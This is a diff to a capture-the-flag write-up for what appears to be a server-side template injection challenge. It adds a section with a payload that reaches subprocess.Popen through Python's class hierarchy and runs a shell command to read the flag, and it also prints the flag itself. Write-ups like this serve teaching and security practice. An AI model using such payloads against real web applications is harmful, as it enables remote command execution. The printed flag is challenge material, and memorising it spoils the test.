@@ -51,7 +51,7 @@
 
 ![image](https://github.com/user-attachments/assets/a4b3b2a7-ca56-4dbd-812d-d42543db5721)
 
-- After checking the list of available, I got shell command access with class `subprocess.Popen` on index `213`
+- After checking the list of available classes, I got shell command access with class `subprocess.Popen` on index `213`
 
        Payload: {{''.__class__.__base__.__subclasses__()[213]}}
 
@@ -59,9 +59,13 @@
 
 ### Reading the flag
 
+- Flag payload
 
+      Payload: {{''.__class__.__base__.__subclasses__()[213]("cat flag",shell=True,stdout=-1).communicate()}}
 
+![image](https://github.com/user-attachments/assets/9312e1e3-ace1-42cc-8fff-53d6714c7bda)
 
+- Flag-:```DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}```
 
   
 
